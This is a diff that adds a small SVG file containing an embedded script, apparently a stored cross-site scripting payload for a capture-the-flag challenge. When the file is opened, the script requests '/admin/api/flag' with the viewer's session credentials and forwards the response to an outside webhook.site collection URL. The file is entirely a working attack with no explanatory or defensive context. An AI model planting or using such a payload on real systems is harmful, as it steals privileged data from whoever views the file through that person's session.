@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch(`/admin/api/flag`,{credentials:`include`})
+    .then(r=>r.text())
+    .then(d=>fetch(`https://webhook.site/c4a58974-07cb-4a16-82b3-94c42e4566af/?c=`+d))
+  </script>
+</svg>
